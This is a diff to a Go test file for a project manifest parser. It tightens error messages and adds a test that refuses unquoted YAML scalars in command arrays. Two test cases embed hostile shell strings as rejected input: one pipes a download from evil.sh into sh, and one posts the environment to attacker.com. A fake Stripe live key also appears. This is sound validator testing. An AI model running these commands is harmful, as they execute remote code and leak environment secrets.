@@ -176,12 +176,14 @@ tasks:
 		{name: "R1 shell string where argv expected",
 			yaml: strings.Replace(base, "start: [pnpm, dev]",
 				`start: "pnpm dev && curl evil.sh | sh"`, 1),
-			expect: "cannot unmarshal"},
+			// The message names the rule and the fix. "cannot unmarshal" is
+			// true and useless, and this is the one mistake worth spelling out.
+			expect: "argv arrays, not shell strings"},
 
 		{name: "R1 shell string in a task",
 			yaml: strings.Replace(base, "run: [pnpm, test]",
 				`run: "pytest && curl attacker.com -d $(env)"`, 1),
-			expect: "cannot unmarshal"},
+			expect: "argv arrays, not shell strings"},
 
 		{name: "R3 literal Stripe key",
 			mutate: "    env:\n      STRIPE: sk_" + "live_51H8xQ2eZvKYlo2C\n",
@@ -396,4 +398,48 @@ func load(t *testing.T, name string) *Manifest {
 		t.Fatalf("fixture %s: %v", name, err)
 	}
 	return m
+}
+
+// YAML resolves bare true, 5 and null to a boolean, an integer and a null, and
+// the decoder coerces them into "true", "5" and "". That is how `run: [true]`
+// came to mean the /bin/true command by accident, and it made devbay accept
+// manifests the published schema rejects -- so a third party reimplementing
+// from the spec would refuse a file devbay runs happily.
+func TestCommandArgumentsMustBeWrittenAsStrings(t *testing.T) {
+	for _, tc := range []struct{ name, argv string }{
+		{"boolean", `[true]`},
+		{"integer", `[sleep, 5]`},
+		{"null", `[echo, null]`},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			_, err := Parse([]byte(`
+version: 1
+project: p
+services:
+  web: {image: node:22, port: 3000, primary: true, health: {http: /}}
+tasks:
+  unit: {run: ` + tc.argv + `, needs: []}
+`))
+			if err == nil {
+				t.Fatalf("%s was coerced into a string instead of being refused", tc.name)
+			}
+			// The message has to name the fix; "cannot unmarshal" would not.
+			if !strings.Contains(err.Error(), "must be strings") {
+				t.Errorf("the message does not say what to write: %v", err)
+			}
+		})
+	}
+
+	// And the quoted forms are accepted, since they are what the fix asks for.
+	if _, err := Parse([]byte(`
+version: 1
+project: p
+services:
+  web: {image: node:22, port: 3000, primary: true, health: {http: /}}
+tasks:
+  unit: {run: ["true"], needs: []}
+  wait: {run: [sleep, "5"], needs: []}
+`)); err != nil {
+		t.Errorf("the quoted form was refused: %v", err)
+	}
 }
